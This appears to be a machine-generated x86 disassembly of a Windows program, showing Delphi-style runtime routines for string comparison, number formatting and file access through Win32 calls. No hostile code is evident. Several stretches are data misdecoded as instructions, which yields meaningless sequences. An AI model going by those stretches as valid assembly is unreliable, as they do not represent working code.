mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406d11
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406d39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d40
retn
sub_406d4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406d71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d78
retn
sub_406d84
xchg esi eax
dec eax
add al dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax + 0x640000ff ] dh
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] dh
xchg esi eax
dec eax
add [ edx + 0x640000ff ] dh
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] dh
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] dh
dec eax
add [ ebp + 0x640000ff ] dh
xchg esi eax
dec eax
add [ esi + 0x640000ff ] dh
xchg esi eax
dec eax
add [ edi + 0x640000ff ] dh
xchg esi eax
dec eax
add [ eax + 0x640000ff ] bh
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] bh
xchg esi eax
dec eax
add [ edx + 0x640000ff ] bh
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] bh
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] bh
dec eax
add [ ebp + 0x640000ff ] bh
xchg esi eax
dec eax
add [ esi + 0x640000ff ] bh
xchg esi eax
dec eax
add [ edi + 0x640000ff ] bh
xchg esi eax
dec eax
add [ eax + 0x640000ff ] ah
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] ah
xchg esi eax
dec eax
add [ edx + 0x640000ff ] ah
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] ah
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] ah
dec eax
add [ ebp + 0x640000ff ] ah
xchg esi eax
dec eax
add [ esi + 0x640000ff ] ah
xchg esi eax
dec eax
add [ edi + 0x640000ff ] ah
xchg esi eax
dec eax
add [ eax + 0x640000ff ] ch
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] ch
xchg esi eax
dec eax
add [ edx + 0x640000ff ] ch
xchg esi eax
dec eax
add [ ebx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_407089
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407090
retn
sub_407b59
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax - 0x33 ] al
inc eax
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
inc ebx
outsd
jne r-xdata
loopne r-xdata
je r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407bbc3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
jl r-xdata
jb r-xdata
adc [ ecx + 0x48013415 ] cl
add [ ebx + 0x487bb815 ] cl
add [ ebx + 0xa890448 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] cl
xor [ eax ] eax
in al 0xce
add al bl
jpo r-xdata
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
add eax 0xffffffd4
jmp sub_40d05c
je r-xdata
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add ah ah
into
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 + 0x40 ] al
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x33840040 ] ah
inc eax
add [ eax + ebx * 2 ] bh
inc eax
add [ eax + 0x58 ] cl
inc eax
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
pop eax
pop eax
inc eax
stosb [ edi ]
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026fc
call ebx
pop ebx
retn
xor al 0x1
dec eax
add [ ebx + 0x34158910 ] cl
add [ eax ] ecx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
arpl [ eax + 0x72 ] bp
outsd
sub_407c6c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407c88
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
pop edi
pop esi
pop ebx
retn
sub_407cac
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026dc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b5c
mov eax esi
pop esi
pop ebx
retn
sub_407ccc
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026fc
call ebx
pop ebx
retn
sub_407cf8
push ebx
mov ebx eax
mov eax 0xc
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407ccc
pop ebx
retn
sub_407d30
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404210
mov ebx eax
mov eax edi
mov edx ebx
call sub_40459c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407d6c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404210
mov ebx eax
mov eax edi
mov edx ebx
call sub_40459c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407da8
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407dd8
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407df8
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407e4c
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407df8
test eax eax
jne r-xdata
sub_407e70
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404210
mov ebx eax
mov eax esi
call sub_404410
mov edx eax
mov eax edi
mov ecx ebx
call sub_404040
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407ea4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404210
push eax
mov eax esi
call sub_404410
push eax
mov eax ebx
call sub_404210
push eax
mov eax ebx
call sub_404410
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407edc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404210
push eax
mov eax esi
call sub_404410
push eax
mov eax ebx
call sub_404210
push eax
mov eax ebx
call sub_404410
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407f2c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407f4c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404210
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403f50
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404470
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407f9c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404210
mov ebx eax
jmp r-xdata
test ebx ebx
jle r-xdata
push edi
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_404470
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
jbe r-xdata
dec ebx
sub_407fd0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404210
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404210
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408034
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_40804a
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_40804a
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40804a
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408080
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_408034
mov edx esi
pop eax
call sub_404040
add esp 0x10
pop esi
retn
sub_4080a0
or cl cl
jne sub_4080d4
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4080d4
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4080d4
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_4080d4
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40816c
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_4080a0
mov edx esi
pop eax
call sub_404040
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408194
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_408034
mov edx esi
pop eax
call sub_404040
add esp 0x20
pop esi
retn
xor edx edx
sub_4081bc
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b7c
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407c88
sub_408210
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b7c
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408230
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404d18
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408250
mov eax [ rw-data ]
call sub_404f48
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404f48
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405104
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fa4
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405104
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fa4
sub_4082e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407f14
test al al
je r-xdata
sub_40831c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409580
mov edx eax
test dl dl
je r-xdata
call sub_408250
push ebp
mov eax [ rw-data ]
call sub_404f50
mov edx eax
mov eax [ rw-data ]
call sub_4082e0
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404f50
mov edx eax
mov eax [ rw-data ]
call sub_4082e0
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4083b8
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fa4
call sub_408250
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fa4
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fa4
jmp r-xdata
pop esi
pop ebx
retn
sub_408404
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404410
push eax
call CreateFileA
sub_40845c
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404410
push eax
call CreateFileA
pop ebx
retn
sub_408488
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4084b4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4084e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408520
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_404410
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4085b0
push ebx
push esi
mov esi eax
mov eax esi
call sub_404210
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c05c
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_4085e0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404210
mov edi eax
mov eax ebx
call sub_404410
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_40889c
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c05c
cmp al 0x2
jne r-xdata
dec edi
sub_408630
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4085e0
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404470
pop edi
pop esi
pop ebx
retn
sub_408668
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404410
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404040
add esp 0x108
pop esi
pop ebx
retn
sub_4086a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404cf4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404cf4
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408754
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_40877c
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_4087b0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404210
push eax
mov eax ebx
call sub_404410
mov edx eax
mov eax esi
pop ecx
call sub_40877c
pop esi
pop ebx
retn
sub_4087d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404410
mov edx eax
mov ecx edi
mov eax ebx
call sub_40877c
pop edi
pop esi
pop ebx
retn
sub_4087f4
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408818
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
